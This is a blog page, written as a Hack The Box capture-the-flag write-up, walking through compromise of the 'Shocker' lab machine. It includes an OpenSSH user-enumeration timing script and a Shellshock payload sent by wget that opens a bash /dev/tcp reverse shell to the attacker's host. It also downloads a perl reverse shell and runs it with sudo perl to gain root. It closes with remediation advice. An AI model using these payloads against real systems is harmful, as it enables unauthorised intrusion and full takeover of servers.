@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <meta name="author" content="Sulejman Bijedic">
+    <meta name="description" content="Write-ups about Linux and Security">
+    <meta name="keywords" content="blog,security,linux">
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Shocker"/>
+<meta name="twitter:description" content="Machine info  OS : Linux Difficulty : Easy Points : 20 IP : 10.10.10.56  Mind Map Reconnaisance Initial scan to check open ports:
+sudo nmap -sSV -p- -n 10.10.10.56 -oA nmap/sSV_scan Scan result:
+Nmap scan report for 10.10.10.56 Host is up (0.064s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) 2222/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2."/>
+
+    <meta property="og:title" content="Shocker" />
+<meta property="og:description" content="Machine info  OS : Linux Difficulty : Easy Points : 20 IP : 10.10.10.56  Mind Map Reconnaisance Initial scan to check open ports:
+sudo nmap -sSV -p- -n 10.10.10.56 -oA nmap/sSV_scan Scan result:
+Nmap scan report for 10.10.10.56 Host is up (0.064s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) 2222/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/hackthebox/shocker/" />
+<meta property="article:published_time" content="2020-06-15T16:04:02+01:00" />
+<meta property="article:modified_time" content="2020-06-15T16:04:02+01:00" />
+
+
+    
+      <base href="/posts/hackthebox/shocker/">
+    
+    <title>
+  Shocker · lafx0
+</title>
+
+    
+      <link rel="canonical" href="/posts/hackthebox/shocker/">
+    
+
+    <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.11.2/css/all.css" integrity="sha384-KA6wR/X5RY4zFAHpv/CnoG2UW1uogYfdnP67Uv7eULvTveboZJg0qUpmJZb5VqzN" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" integrity="sha256-l85OmPOjvil/SOvVt3HnSSjzF1TUMyT9eV0c2BzEGzU=" crossorigin="anonymous" />
+
+    
+      
+      
+      <link rel="stylesheet" href="/css/coder.min.a4f332213a21ce8eb521670c614470c58923aaaf385e2a73982c31dd7642decb.css" integrity="sha256-pPMyITohzo61IWcMYURwxYkjqq84XipzmCwx3XZC3ss=" crossorigin="anonymous" media="screen" />
+    
+
+    
+
+    
+
+    
+      <link rel="stylesheet" href="/css/custom.css" />
+    
+
+    
+
+    
+
+    <link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">
+
+    <meta name="generator" content="Hugo 0.66.0" />
+  </head>
+
+  
+  
+  <body class="colorscheme-light">
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      lafx0
+    </a>
+    
+    <input type="checkbox" id="menu-toggle" />
+    <label class="menu-button float-right" for="menu-toggle"><i class="fas fa-bars"></i></label>
+    <ul class="navigation-list">
+      
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="/posts/">Blog</a>
+          </li>
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="/about/info/">About</a>
+          </li>
+        
+      
+      
+    </ul>
+    
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">Shocker</h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fas fa-calendar"></i>
+              <time datetime='2020-06-15T16:04:02&#43;01:00'>
+                June 15, 2020
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fas fa-clock"></i>
+              6-minute read
+            </span>
+          </div>
+          
+          
+        </div>
+      </header>
+
+      <div>
+        
+        <h1 id="machine-info">Machine info</h1>
+<ul>
+<li>OS : Linux</li>
+<li>Difficulty : Easy</li>
+<li>Points : 20</li>
+<li>IP : 10.10.10.56</li>
+</ul>
+<h1 id="mind-map">Mind Map</h1>
+<p><img src="/images/htb/shocker_mindmap.png" alt="Lame_MindMap"></p>
+<h1 id="reconnaisance">Reconnaisance</h1>
+<p>Initial scan to check open ports:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sSV -p- -n 10.10.10.56 -oA nmap/sSV_scan</code></pre></div>
+<p>Scan result:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">Nmap scan report for 10.10.10.56
+Host is up (0.064s latency).
+Not shown: 65533 closed ports
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div>
+<p><strong>Note:</strong> Scanning in TCP mode (-ST) and in UDP mode (-sU) don&rsquo;t reveal any new open port.</p>
+<h1 id="enumeration">Enumeration</h1>
+<h3 id="ssh">SSH</h3>
+<p>The OpenSSH 7.2p2 service is vulnerable to <strong>CVE:2016-6210</strong>.</p>
+<blockquote>
+<p>By sending large passwords, a remote user can enumerate users on system that runs SSHD. This problem exists in most
+modern configuration due to the fact that it takes much longer to calculate SHA256/SHA512 hash than BLOWFISH hash.</p>
+</blockquote>
+<p>Here is the python script:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> paramiko
+<span style="color:#f92672">import</span> time
+user<span style="color:#f92672">=</span>raw_input(<span style="color:#e6db74">&#34;user: &#34;</span>)
+p<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">25000</span>
+ssh <span style="color:#f92672">=</span> paramiko<span style="color:#f92672">.</span>SSHClient()
+starttime<span style="color:#f92672">=</span>time<span style="color:#f92672">.</span>clock()
+ssh<span style="color:#f92672">.</span>set_missing_host_key_policy(paramiko<span style="color:#f92672">.</span>AutoAddPolicy())
+<span style="color:#66d9ef">try</span>:
+        ssh<span style="color:#f92672">.</span>connect(<span style="color:#e6db74">&#39;127.0.0.1&#39;</span>, username<span style="color:#f92672">=</span>user,
+        password<span style="color:#f92672">=</span>p)
+<span style="color:#66d9ef">except</span>:
+        endtime<span style="color:#f92672">=</span>time<span style="color:#f92672">.</span>clock()
+total<span style="color:#f92672">=</span>endtime<span style="color:#f92672">-</span>starttime
+<span style="color:#66d9ef">print</span>(total)</code></pre></div>
+<p><strong>Note</strong>: Valid users will result in higher total time.</p>
+<p>With this method I was able to discover only the <em>root</em> user (nothing special), and then tried to brute force ssh with <em>Hydra</em> and <em>Medusa</em>, but without success.</p>
+<h3 id="http">HTTP</h3>
+<p>The web page hosted at port 80 shows nothing more that an image. No links and the web page source code is not interesting.</p>
+<p>I try to search for common URLs like resources like /index.php, /login.php, /cgi-bin and I can see that the server is running CGI as I receive a 403 status code - Forbidden - visiting <code>http://10.10.10.56/cgi-bin/</code></p>
+<p><strong>-&gt; CGI programs are of primary concern in regards to shellshock vulnerabilities.</strong></p>
+<p><img src="/images/htb/shellshock.png" alt="Shellshock"></p>
+<p>-&gt; A very good article about this vulnerability: <a href="https://blog.cloudflare.com/inside-shellshock/">https://blog.cloudflare.com/inside-shellshock/</a></p>
+<h1 id="exploitation">Exploitation</h1>
+<p>The Metasploit module <code>apache_mod_cgi_bash_env</code> helps in checking for shellshock exploitability. In order for the module to work I need to specify an available CGI program / file to test. To find a valid resource I can conduct a dictionary attack on the web server and see If I can find something useful for the purpose:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo /opt/dirsearch/dirsearch.py -u http://10.10.10.56/cgi-bin/ -e sh,cgi -r -f</code></pre></div>
+<p>Where:</p>
+<ul>
+<li><code>/opt/dirsearch/</code> is the folder where the dirsearch script is located on my machine</li>
+<li><code>-u</code> stands for URL</li>
+<li><code>-e</code> stands for extensions to test</li>
+<li><code>-r</code> and <code>-f</code> stands for recursive mode and force extensions for every wordlist entry respectively</li>
+</ul>
+<p>It takes some time for the script to run, but at the end I&rsquo;m able to find the file <code>user.sh</code> which returns a <strong>200</strong> code:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">[17:03:56] 403 -  305B  - /cgi-bin/.htpasswrd/
+[17:03:56] 403 -  305B  - /cgi-bin/.htusers.sh
+[17:03:56] 403 -  306B  - /cgi-bin/.htusers.cgi
+[17:03:56] 403 -  303B  - /cgi-bin/.htusers/
+[17:06:14] 200 -  118B  - /cgi-bin/user.sh</code></pre></div>
+<p>At this point I can configure the previous module in Metasploit setting the following options:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">set RHOSTS : 10.10.10.56
+set RPORT : 80
+set TARGETURI : /cgi/bin/user.sh</code></pre></div>
+<p>The module will try by default to run the command <code>/usr/bin/id</code> on the server. If the module returns the result of the <code>id</code> command, that means the server is vulnerable to shellshock and I&rsquo;m able to run any command I want on it!</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">msf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) &gt; run
+
+[+] uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed</code></pre></div>
+<p>The module returned the id! Great!</p>
+<p>At this point I can set any command I want to run setting the CMD value in the Metasploit module. This <strong>bash reverse shell</strong> will do the trick:</p>
+<p><code>set CMD /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.18/4444 0&gt;&amp;1</code></p>
+<p><strong>Note</strong>: I&rsquo;m not using netcat here to connect because I&rsquo;m not sure If it is installed on the target machine.</p>
+<p>Where:</p>
+<ul>
+<li><code>bash -i</code> invokes bash with an &lsquo;interactive&rsquo; option</li>
+<li><code>&gt;&amp;</code> redirects stdout and stderr to the specified target</li>
+<li><code>/dev/tcp/10.10.14.18/4444</code> is a TCP client connection to IP/PORT</li>
+<li><code>0&gt;&amp;1</code> redirects stdin (0) to stdout (1), so the opened TCP connection is used to read the input</li>
+</ul>
+<p>Another way to accomplish this could be done with the <em>wget</em> command as follows:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wget -U <span style="color:#e6db74">&#39;() { test;}; echo; /bin/bash -i&gt;&amp; /dev/tcp/10.10.14.18/4444 0&gt;&amp;1&#39;</span> http://10.10.10.56/cgi-bin/user.sh
+--2020-06-16 18:55:20--  http://10.10.10.56/cgi-bin/user.sh
+Connecting to 10.10.10.56:80... connected.
+HTTP request sent, awaiting response...</code></pre></div>
+<p>I can see the connection coming back to my netcat listener:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.18] from (UNKNOWN) [10.10.10.56] 45352
+bash: no job control in this shell
+shelly@Shocker:/usr/lib/cgi-bin$ whoami
+whoami
+shelly</code></pre></div>
+<h1 id="privilege-escalation">Privilege escalation</h1>
+<p>Let&rsquo;s see what the user shelly can sudo without providing a password:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">shelly@Shocker:/home/shelly$ sudo -l
+sudo -l
+Matching Defaults entries for shelly on Shocker:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User shelly may run the following commands on Shocker:
+    (root) NOPASSWD: /usr/bin/perl</code></pre></div>
+<p>She can run the perl program with root privilege, great! That means that I can upload a perl reverse shell on the machine and run it with root privileges in order to have a connection back on my machine!</p>
+<p>Let&rsquo;s first set up a netcat listener:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">nc -nlvp 4456
+listening on [any] 4456 ...</code></pre></div>
+<p>I have a perl reverse shell under <code>/usr/share/webshells</code>. I have to edit the <em>perl-reverse-shell.pl</em> file to specify where to send the reverse shell:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"># Where to send the reverse shell.  Change these.
+my $ip = &#39;10.10.14.18&#39;;
+my $port = 4456;</code></pre></div>
+<p>At this point I can set up a python server and retrieve the shell from the target machine:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">python -m SimpleHTTPServer 8888
+Serving HTTP on 0.0.0.0 port 8888 ...</code></pre></div>
+<p>On target:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">shelly@Shocker:/home/shelly$ wget http://10.10.14.18:8888/perl-reverse-shell.pl
+$ wget http://10.10.14.18:8888/perl-reverse-shell.pl                        
+--2020-06-16 14:14:01--  http://10.10.14.18:8888/perl-reverse-shell.pl
+Connecting to 10.10.14.18:8888... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3714 (3.6K) [text/x-perl]
+Saving to: &#39;perl-reverse-shell.pl&#39;
+
+     0K ...                                                   100% 1.65M=0.002s
+
+2020-06-16 14:14:01 (1.65 MB/s) - &#39;perl-reverse-shell.pl&#39; saved [3714/3714]</code></pre></div>
+<p>Now I can launch the perl reverse shell and see I get a connection back with root privileges! That was easy!</p>
+<p>On target:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">shelly@Shocker:/home/shelly$ sudo /usr/bin/perl perl-reverse-shell.perl
+sudo /usr/bin/perl perl-reverse-shell.perl
+Content-Length: 0
+Connection: close
+Content-Type: text/html
+
+shelly@Shocker:/home/shelly$ Content-Length: 42
+Connection: close
+Content-Type: text/html
+
+Sent reverse shell to 10.10.14.18:4456</code></pre></div>
+<p>On my machine:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">nc -nlvp 4456
+listening on [any] 4456 ...
+connect to [10.10.14.18] from (UNKNOWN) [10.10.10.56] 58268
+ 14:17:48 up  7:29,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+Linux Shocker 4.4.0-96-generic #119-Ubuntu SMP Tue Sep 12 14:59:54 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+uid=0(root) gid=0(root) groups=0(root)
+/
+/usr/sbin/apache: 0: can&#39;t access tty; job control turned off
+# whoami
+root
+#</code></pre></div>
+<p><strong>Note</strong>: flags are under /home and /root</p>
+<h2 id="lessons-learned-and-remediations">Lessons learned and remediations</h2>
+<ul>
+<li>
+<p>As they always say, <strong>enumeration is key</strong>!</p>
+</li>
+<li>
+<p>The administrator should have restricted access to all the files in the /cgi-bin directory, because from there I was able to exploit the Shellshock vulnerability.</p>
+</li>
+<li>
+<p>The administrator should have patched his system against the Shellshock vulnerability (the patch exists).</p>
+</li>
+<li>
+<p>The ability to run perl with root privileges gave me a chance to obtain full control on the machine. The administrator should check that configuration to see if it is strictly necessary.</p>
+</li>
+</ul>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+      </footer>
+    </article>
+
+    <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+  <script type="text/javascript" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/startup.js" id="MathJax-script"></script>
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [
+          ['$', '$'], ['\\(', '\\)']
+        ],
+        processEscapes: true,
+        processEnvironments: true
+      },
+      options: {
+        skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre']
+      }
+    };
+  </script>
+  </section>
+
+      </div>
+
+      <footer class="footer">
+  <section class="container">
+    
+      <p>'  '</p>
+    
+    
+    
+    
+  </section>
+</footer>
+
+    </main>
+
+    
+
+    
+
+  </body>
+
+</html>
